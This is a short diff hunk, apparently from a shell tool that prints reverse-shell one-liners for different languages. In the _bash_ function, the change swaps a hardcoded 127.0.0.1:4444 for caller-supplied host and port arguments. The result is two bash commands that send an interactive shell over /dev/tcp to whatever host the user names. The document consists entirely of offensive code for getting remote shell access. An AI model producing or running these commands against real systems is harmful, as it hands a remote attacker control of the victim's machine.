@@ -57,8 +57,8 @@ function _awk_(){
 
 function _bash_(){
 
-	printf "bash -c \"bash -i >& /dev/tcp/127.0.0.1/4444 0>&1\"\n\n"
-	printf "bash -c \"bash -l > /dev/tcp/127.0.0.1/4444 0<&1 2>&1\""
+	printf "bash -c \"bash -i >& /dev/tcp/$2/$3 0>&1\"\n\n"
+	printf "bash -c \"bash -l > /dev/tcp/$2/$3 0<&1 2>&1\""
 }
 
 function _c_(){
